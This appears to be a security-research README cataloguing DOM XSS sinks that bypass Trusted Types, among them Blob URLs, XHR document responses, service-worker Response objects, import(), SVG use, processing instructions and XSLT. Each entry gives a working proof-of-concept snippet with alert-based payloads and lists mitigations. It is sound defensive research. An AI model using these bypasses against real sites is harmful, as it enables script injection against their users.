# Cursed Types

This repo contains list of DOM-based XSS sinks which are not subject to [Trusted Types](https://web.dev/trusted-types/) checks. Contributions welcome! 😊

## Blob URL

Trusted Types enforced on a document will be inherited to Blob URL when navigating to Blob URL. However, resulting document of the Blob URL contains stored XSS payload, and therefore it bypasses Trusted Types check.

[PoC](https://shhnjk.github.io/PoCs/cursed_types/blob_url.html):
```
let attackerControlledString = '<img src=x onerror=alert(origin)>';
const blob = new Blob([attackerControlledString], {type: 'text/html'});
const url = URL.createObjectURL(blob);
location.href = url;
```

### Mitigations:
- Enforce [Strict CSP](https://w3c.github.io/webappsec-csp/#strict-csp).
- There is a discussion to provide an option for creating a [secure Blob URL](https://github.com/w3c/FileAPI/issues/74).

## XHR document response

XMLHttpRequest (XHR) supports [`document` response type](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/HTML_in_XMLHttpRequest), which returns parsed document of XHR response instead of text.

[PoC](https://shhnjk.github.io/PoCs/cursed_types/xhr_document.html):
```
let attackerControlledString = 'data:text/html,<img id=content src=x onerror=alert(origin)>';
const xhr = new XMLHttpRequest();
xhr.onload = function() {
  document.body.appendChild(this.response.querySelector('#content'));
}

xhr.open("GET", attackerControlledString);
// The following changes response type from text to parsed document.
xhr.responseType = "document";
xhr.send();
```

### Mitigations:
- Enforce [Strict CSP](https://w3c.github.io/webappsec-csp/#strict-csp).
- Only allow trusted endpoints in [CSP connect-src](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/connect-src).

## Response API

[Response API](https://developer.mozilla.org/en-US/docs/Web/API/Response/Response) can be used in several places to serve a response of a request through Service Worker. If the Response is generated from user input, this could result in Trusted Types bypasses.

[PoC](https://shhnjk.github.io/PoCs/cursed_types/service_worker_response.html):
```
self.addEventListener('fetch', event => {
  const params = new URLSearchParams(event.request.url.split('?')[1]);
  let attackerControlledString = params.get('attackerControlledString');
  
  if (attackerControlledString) {
    init = {
      headers: {
        'Content-Type': 'text/html',
        'Content-Security-Policy': "require-trusted-types-for 'script'; trusted-types 'none';"
          
      }
    };
    event.respondWith(new Response(attackerControlledString, init));
  }
});
```

```
// Assuming legit service worker returns cached content.
caches.open("v1").then(cache => {
  let attackerControlledString = '<img src=x onerror=alert(origin)>';
  init = {
    headers: {
      'Content-Type': 'text/html',
      'Content-Security-Policy': "require-trusted-types-for 'script'; trusted-types 'none';"

    }
  };
  cache.put('xss', new Response(attackerControlledString, init));
})
```

### Mitigations:
- Enforce [Strict CSP](https://w3c.github.io/webappsec-csp/#strict-csp).

## Non-DOM API based script loading

[Non-DOM API based script loading](https://github.com/w3c/webappsec-trusted-types/issues/232) currently bypasses Trusted Types.

[PoC](https://shhnjk.github.io/PoCs/cursed_types/script_loading.html):
```
let attackerControlledString = 'data:application/javascript,alert(origin)';
import(attackerControlledString);
```

### Mitigations:
- Enforce [Strict CSP](https://w3c.github.io/webappsec-csp/#strict-csp) + serve allow-list of script endpoints in another `script-src` directive.

## SVG `<use>` element

[SVG `<use>`](https://developer.mozilla.org/en-US/docs/Web/SVG/Element/use) element takes `href` attribute, which can import an external SVG image from given URL. This currently bypasses Trusted Types check. This was found by [Masato](https://twitter.com/kinugawamasato).


[PoC](https://shhnjk.github.io/PoCs/cursed_types/svg_use.html):
```
let attackerControlledString = 
    `data:image/svg+xml,
     <svg id="x" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
       <image href="x" onerror="alert(origin)" />
     </svg>#x`;
const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
const use = document.createElementNS('http://www.w3.org/2000/svg', 'use');
use.setAttributeNS('http://www.w3.org/1999/xlink', 'href', attackerControlledString);
svg.appendChild(use);    
document.body.appendChild(svg);
```

### Mitigations:
- Enforce [Strict CSP](https://w3c.github.io/webappsec-csp/#strict-csp).
- This is likely to be fixed in the future ([reference](https://github.com/w3c/webappsec-trusted-types/issues/357)).

## document.createProcessingInstruction API

[`document.createProcessingInstruction`](https://developer.mozilla.org/en-US/docs/Web/API/Document/createProcessingInstruction) can create [processing instruction](https://developer.mozilla.org/en-US/docs/Web/API/ProcessingInstruction) node from given URL and content type. This node can be inserted to a document which is [valid as XML](https://twitter.com/kinugawamasato/status/1493901445103439876). Currently there is no Trusted Types check on `document.createProcessingInstruction`. This was found by [Masato](https://twitter.com/kinugawamasato).

[PoC](https://shhnjk.github.io/PoCs/cursed_types/createProcessingInstruction.xml):
```
/*
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <xsl:output method="html" />
  <xsl:template match="/">
    <script>alert(origin)</script>
  </xsl:template>
</xsl:stylesheet>
*/
let attackerControlledString = 'data:text/xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHhzbDpzdHlsZXNoZWV0IHhtbG5zOnhzbD0iaHR0cDovL3d3dy53My5vcmcvMTk5OS9YU0wvVHJhbnNmb3JtIiB2ZXJzaW9uPSIxLjAiPgogIDx4c2w6b3V0cHV0IG1ldGhvZD0iaHRtbCIgLz4KICA8eHNsOnRlbXBsYXRlIG1hdGNoPSIvIj4KICAgIDxzY3JpcHQ+YWxlcnQob3JpZ2luKTwvc2NyaXB0PgogIDwveHNsOnRlbXBsYXRlPgo8L3hzbDpzdHlsZXNoZWV0Pg==';
const pi = document.createProcessingInstruction('xml-stylesheet', `href='${attackerControlledString}' type='text/xml'`);
document.insertBefore(pi, document.firstChild);
```

### Mitigations:
- Enforce [Strict CSP](https://w3c.github.io/webappsec-csp/#strict-csp).

## XSLT

Some elements in [XSLT](https://developer.mozilla.org/en-US/docs/Web/XSLT) supports `disable-output-escaping` (such as [`<xsl:text>`](https://developer.mozilla.org/en-US/docs/Web/XSLT/Element/text) and [`<xsl:value-of>`](https://developer.mozilla.org/en-US/docs/Web/XSLT/Element/value-of)). When `disable-output-escaping` is set to `yes`, escaping of HTML special characters will be disabled (and therefore XSS will be triggered). Currently, Trusted Types is bypassible in this case. This was found by [Alex](https://twitter.com/insertScript).

[PoC](https://shhnjk.github.io/PoCs/cursed_types/xslt.html):
```
let attackerControlledString = '<img src=x onerror=alert(origin)>';
const doc = document.implementation.createHTMLDocument();
const xslt = document.createElementNS('http://www.w3.org/1999/XSL/Transform', 'xsl:stylesheet');
xslt.setAttribute('xmlns:xsl', 'http://www.w3.org/1999/XSL/Transform');
const template = document.createElementNS('http://www.w3.org/1999/XSL/Transform', 'xsl:template');
template.setAttribute('match', '/');
const output = document.createElementNS('http://www.w3.org/1999/XSL/Transform', 'xsl:output');
output.setAttribute('method', 'html');
xslt.appendChild(output);
const text = document.createElementNS('http://www.w3.org/1999/XSL/Transform', 'xsl:text');
text.textContent = attackerControlledString;
text.setAttribute('disable-output-escaping', 'yes');
template.appendChild(text);
xslt.appendChild(template);
const processor = new XSLTProcessor();
processor.importStylesheet(xslt);
const fragment = processor.transformToFragment(doc, document);
document.body.appendChild(fragment);
```

### Mitigations:
- Enforce [Strict CSP](https://w3c.github.io/webappsec-csp/#strict-csp).
